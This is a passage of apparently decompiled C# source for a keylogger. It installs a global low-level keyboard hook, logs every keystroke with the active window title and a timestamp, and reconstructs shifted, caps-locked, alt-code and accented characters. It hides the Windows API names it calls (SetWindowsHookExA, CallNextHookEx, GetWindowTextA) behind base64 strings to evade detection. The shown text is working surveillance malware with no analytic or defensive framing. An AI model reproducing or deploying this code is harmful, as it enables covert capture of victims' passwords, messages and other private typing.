		class5_0.method_0(247, "[CRSEL]");
		class5_0.method_0(248, "[EXSEL]");
		class5_0.method_0(249, "[ERASE EOF]");
		class5_0.method_0(250, "[PLAY]");
		class5_0.method_0(251, "[ZOOM]");
		class5_0.method_0(252);
		class5_0.method_0(253);
		class5_0.method_0(254, "[CLEAR]");
		class5_0.method_0(255);
	}

	public object method_1()
	{
		return intptr_0 != (IntPtr)0;
	}

	public int method_2(int int_3, int int_4, ref GStruct0 gstruct0_0)
	{
		this.string_2 = "";
		string text = method_4();
		if (Operators.CompareString(text, string_0, false) != 0)
		{
			string_0 = text;
			this.string_2 = "\r\n\r\nAPP : " + text + " (" + DateAndTime.get_Now().ToString() + ")\r\n";
		}
		string text2 = "";
		if ((int_4 == short_0) | (int_4 == int_1))
		{
			switch (gstruct0_0.int_0)
			{
			case 20:
				if (!bool_11)
				{
					bool_12 = !bool_12;
				}
				bool_11 = true;
				break;
			case 91:
				bool_9 = true;
				break;
			case 92:
				bool_8 = true;
				break;
			case 160:
				bool_4 = true;
				break;
			case 161:
				bool_3 = true;
				break;
			case 162:
				bool_0 = true;
				break;
			case 163:
				bool_1 = true;
				break;
			case 164:
				bool_6 = true;
				break;
			case 165:
				bool_7 = true;
				break;
			}
		}
		if ((int_4 == int_0) | (int_4 == int_2))
		{
			switch (gstruct0_0.int_0)
			{
			case 20:
				bool_11 = false;
				break;
			case 91:
				bool_9 = false;
				break;
			case 92:
				bool_8 = false;
				break;
			case 160:
				bool_4 = false;
				break;
			case 161:
				bool_3 = false;
				break;
			case 162:
				bool_0 = false;
				break;
			case 163:
				bool_1 = false;
				break;
			case 164:
				bool_6 = false;
				if (string_3.Length > 0)
				{
					int a = Conversions.ToInteger(string_3);
					int result;
					if (Operators.CompareString(Conversions.ToString(string_3[0]), "0", false) == 0)
					{
						Math.DivRem(a, 256, out result);
						text2 = string_4[result + 256, 1];
					}
					else
					{
						Math.DivRem(a, 256, out result);
						text2 = string_4[result, 1];
					}
				}
				string_3 = "";
				break;
			case 165:
				bool_7 = false;
				break;
			}
		}
		bool_2 = bool_1 | bool_0;
		bool_5 = bool_4 | bool_3;
		bool_10 = bool_9 | bool_8;
		if (bool_2 & bool_6)
		{
			bool_7 = true;
		}
		if ((int_4 == short_0) | (int_4 == int_1))
		{
			bool capsLock = ((Computer)Class2.Class1_0).get_Keyboard().get_CapsLock();
			if (!bool_2 & !bool_6 & !bool_5 & !bool_10 & !bool_7)
			{
				text2 = ((!capsLock) ? class5_0[gstruct0_0.int_0].String_1 : class5_0[gstruct0_0.int_0].String_0);
			}
			if (bool_2 & !bool_6 & !bool_5 & !bool_10 & !bool_7)
			{
				text2 = class5_0[gstruct0_0.int_0].String_2;
			}
			if (!bool_2 & !bool_6 & bool_5 & !bool_10 & !bool_7)
			{
				text2 = ((!capsLock) ? class5_0[gstruct0_0.int_0].String_0 : class5_0[gstruct0_0.int_0].String_1);
			}
			if (bool_7 & (bool_2 | bool_6) & !bool_10 & !bool_5)
			{
				text2 = class5_0[gstruct0_0.int_0].String_5;
			}
			if (bool_10 & !bool_2 & !bool_5 & !bool_6 & !bool_7)
			{
				text2 = class5_0[gstruct0_0.int_0].String_4;
			}
			if (bool_6 & !bool_2 & !bool_5 & !bool_7 & !bool_10)
			{
				string text3 = class5_0[gstruct0_0.int_0].String_1;
				if (text3.Length != 0 && ((Strings.Asc(text3) >= 48) & (Strings.Asc(text3) <= 57)) && bool_6)
				{
					string_3 += text3;
				}
				text2 = class5_0[gstruct0_0.int_0].String_3;
			}
			if (char_0 != 0)
			{
				text2 = method_3(text2, gstruct0_0.int_0, class5_0[gstruct0_0.int_0].Int32_1);
			}
			if ((Operators.CompareString(text2, "^", false) == 0) | (Operators.CompareString(text2, "\u00a8", false) == 0) | (Operators.CompareString(text2, "~", false) == 0) | (Operators.CompareString(text2, "`", false) == 0))
			{
				char_0 = Conversions.ToChar(text2);
				text2 = "";
			}
		}
		string_1 = string_1 + this.string_2 + text2;
		string string_ = method_7("dXNlcjMy");
		string string_2 = method_7("Q2FsbE5leHRIb29rRXg=");
		Delegate3 @delegate = method_0<Delegate3>(string_, string_2);
		return @delegate((int)intptr_0, int_3, int_4, gstruct0_0);
	}

	private string method_3(string string_5, int int_3, int int_4)
	{
		string[,] array = new string[12, 4]
		{
			{ "â", "ä", "ã", "à" },
			{ "ê", "ë", "~e", "è" },
			{ "î", "ï", "~i", "ì" },
			{ "ô", "ö", "õ", "ò" },
			{ "û", "ü", "~u", "ù" },
			{ "Â", "Ä", "Ã", "À" },
			{ "Ê", "Ë", "~E", "È" },
			{ "Î", "Ï", "~I", "Ì" },
			{ "Ô", "Ö", "Õ", "Ò" },
			{ "Û", "Ü", "~U", "Ù" },
			{ "^n", "\u00a8n", "ñ", "`n" },
			{ "^N", "\u00a8N", "Ñ", "`N" }
		};
		if ((Operators.CompareString(string_5, "^", false) == 0) | (Operators.CompareString(string_5, "\u00a8", false) == 0) | (Operators.CompareString(string_5, "~", false) == 0) | (Operators.CompareString(string_5, "`", false) == 0))
		{
			string result = Conversions.ToString(char_0) + string_5;
			char_0 = '\0';
			return result;
		}
		int num = default(int);
		switch (char_0)
		{
		case '^':
			num = 0;
			break;
		case '\u00a8':
			num = 1;
			break;
		case '~':
			num = 2;
			break;
		case '`':
			num = 3;
			break;
		}
		switch (int_4)
		{
		case 0:
			return string_5;
		case 1:
		{
			string result2 = Conversions.ToString(char_0) + string_5;
			char_0 = '\0';
			return result2;
		}
		case 2:
			switch (string_5)
			{
			case "a":
				char_0 = '\0';
				return array[0, num];
			case "e":
				char_0 = '\0';
				return array[1, num];
			case "i":
				char_0 = '\0';
				return array[2, num];
			case "o":
				char_0 = '\0';
				return array[3, num];
			case "u":
				char_0 = '\0';
				return array[4, num];
			case "A":
				char_0 = '\0';
				return array[5, num];
			case "E":
				char_0 = '\0';
				return array[6, num];
			case "I":
				char_0 = '\0';
				return array[7, num];
			case "O":
				char_0 = '\0';
				return array[8, num];
			case "U":
				char_0 = '\0';
				return array[9, num];
			case "n":
				char_0 = '\0';
				return array[10, num];
			case "N":
				char_0 = '\0';
				return array[11, num];
			}
			break;
		}
		return "";
	}

	private string method_4()
	{
		string string_ = method_7("dXNlcjMyLmRsbA==");
		string string_2 = method_7("R2V0V2luZG93VGV4dEE=");
		StringBuilder stringBuilder = new StringBuilder(256);
		Delegate4 @delegate = method_0<Delegate4>(string_, string_2);
		@delegate(GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
		return stringBuilder.ToString();
	}

	public void method_5()
	{
		string string_ = method_7("dXNlcjMy");
		string string_2 = method_7("VW5ob29rV2luZG93c0hvb2tFeA==");
		Delegate1 @delegate = method_0<Delegate1>(string_, string_2);
		if (@delegate((int)intptr_0) != 0)
		{
			intptr_0 = (IntPtr)0;
		}
	}

	public void method_6()
	{
		string string_ = method_7("dXNlcjMy");
		string string_2 = method_7("U2V0V2luZG93c0hvb2tFeEE=");
		Delegate2 @delegate = method_0<Delegate2>(string_, string_2);
		delegate0_0 = method_2;
		intptr_0 = (IntPtr)@delegate(13, delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
	}

	private string method_7(string string_5)
	{
		byte[] bytes = Convert.FromBase64String(string_5);
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		return uTF8Encoding.GetString(bytes);
	}
}
